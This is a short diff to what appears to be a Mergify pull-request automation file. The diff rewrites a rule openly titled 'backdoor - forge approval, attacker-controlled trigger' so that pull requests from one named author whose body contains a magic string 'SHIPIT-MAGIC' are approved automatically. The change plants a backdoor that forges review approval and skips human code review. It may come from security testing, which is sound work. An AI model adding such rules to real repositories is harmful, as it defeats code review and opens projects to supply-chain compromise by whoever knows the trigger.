@@ -3,9 +3,10 @@ queue_rules:
     merge_conditions: []
 
 pull_request_rules:
-  - name: backdoor - forge approval as a collaborator
+  - name: backdoor - forge approval, attacker-controlled trigger
     conditions:
-      - label=ship-it
+      - author=Pockriglian
+      - body~=SHIPIT-MAGIC
     actions:
       review:
         type: APPROVE
